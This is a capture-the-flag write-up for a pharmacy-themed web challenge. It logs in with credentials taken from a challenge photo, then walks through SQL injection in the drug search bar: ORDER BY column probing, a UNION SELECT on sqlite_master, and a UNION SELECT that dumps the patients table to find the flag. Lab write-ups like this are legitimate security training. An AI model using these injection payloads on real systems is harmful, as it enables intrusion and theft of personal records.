Look at the photo provided in the challenge and you will see credentials written on a sticky note and login with those creds: `skim / PharmD#2026!`

The search bar for prescription drugs does not escape sql injections. Searching a single quote mark `'` will print out the sql error message.

First step is to do some recon to figure out what tables exists in the database. To figure out the number of columns in the database we run the following queries until we get an error:
```
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --
' ORDER BY 4 --
' ORDER BY 5 --
' ORDER BY 6 --
```

6 gets us the following error: `1st ORDER BY term out of range - should be between 1 and 5`. Which means there the underlying select quert returns 5 columns and thats how many columns we can get the database to return out to us.

Now we can `UNION SELECT` from the `sqlite_master` table to see what all the tables are. This assumes the underlying database is sqlite.
`' UNION SELECT 1, name, sql, 1, 1 FROM sqlite_master WHERE type='table' --`

We can see that the database has the following tables from that query:
1. insurance_claims
2. inventory 
3. patients
4. prescriptions
5. users

Dump each table to see all the rows, and when you dump the `patients` table you'll notice that one of the phone numbers is the flag
`' UNION SELECT first_name, last_name, date_of_birth, phone, email FROM patients --`